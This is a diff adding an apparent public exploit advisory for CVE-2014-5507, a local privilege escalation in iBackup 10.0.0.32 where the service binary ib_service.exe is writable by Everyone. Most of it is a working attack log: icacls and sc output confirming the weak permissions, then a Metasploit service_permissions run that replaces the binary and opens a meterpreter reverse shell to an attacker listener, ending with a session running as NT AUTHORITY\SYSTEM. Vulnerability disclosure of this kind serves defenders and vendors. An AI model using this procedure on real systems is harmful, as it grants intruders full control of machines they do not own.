@@ -1,0 +1,108 @@
+# Exploit Title: iBackup <= 10.0.0.32 Local Privilege Escalation
+# Date: 23/01/2014
+# Author: Glafkos Charalambous <glafkos.charalambous[at]unithreat.com>
+# Version: 10.0.0.32
+# Vendor: IBackup
+# Vendor URL: https://www.ibackup.com/
+# CVE-2014-5507
+
+
+Vulnerability Details
+There are weak permissions for IBackupWindows default installation where everyone is allowed to change 
+the ib_service.exe with an executable of their choice. When the service restarts or the system reboots
+the attacker payload will execute on the system with SYSTEM privileges.
+
+
+C:\Users\0x414141>icacls "C:\Program Files\IBackupWindows\ib_service.exe"
+C:\Program Files\IBackupWindows\ib_service.exe Everyone:(I)(F)
+                                               NT AUTHORITY\SYSTEM:(I)(F)
+                                               BUILTIN\Administrators:(I)(F)
+                                               BUILTIN\Users:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+
+
+C:\Users\0x414141>sc qc IBService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: IBService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\IBackupWindows\ib_service.exe"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : IBackup Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+
+
+msf exploit(service_permissions) > sessions 
+
+Active sessions
+===============
+
+  Id  Type                   Information                    Connection
+  --  ----                   -----------                    ----------
+  1   meterpreter x86/win32  0x414141-PC\0x414141 @ 0x414141-PC  192.168.0.100:8443 -> 192.168.0.102:1158 (192.168.0.102)
+
+
+
+msf exploit(service_permissions) > show options 
+
+Module options (exploit/windows/local/service_permissions):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   AGGRESSIVE  true             no        Exploit as many services as possible (dangerous)
+   SESSION     1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
+   LHOST     192.168.0.100    yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(service_permissions) > exploit 
+
+[*] Started reverse handler on 192.168.0.100:4444 
+[*] Meterpreter stager executable 15872 bytes long being uploaded..
+[*] Trying to add a new service...
+[*] No privs to create a service...
+[*] Trying to find weak permissions in existing services..
+[*] IBService has weak file permissions - C:\Program Files\IBackupWindows\ib_service.exe moved to C:\Program Files\IBackupWindows\ib_service.exe.bak and replaced.
+[*] Restarting IBService
+[*] Could not restart IBService. Wait for a reboot. (or force one yourself)
+
+Upon Reboot or Service Restart
+
+[*] Sending stage (770048 bytes) to 192.168.0.102
+[*] Meterpreter session 2 opened (192.168.0.100:4444 -> 192.168.0.102:14852) at 2014-07-21 00:52:36 +0300
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > background 
+[*] Backgrounding session 2...
+
+msf exploit(service_permissions) > sessions -l
+
+Active sessions
+===============
+
+  Id  Type                   Information                       Connection
+  --  ----                   -----------                       ----------
+  1   meterpreter x86/win32  0x414141-PC\0x414141 @ 0x414141-PC  192.168.0.100:8443 -> 192.168.0.102:1158 (192.168.0.102)
+  2   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ 0x414141-PC  192.168.0.100:4444 -> 192.168.0.102:14852 (192.168.0.102)
+
+
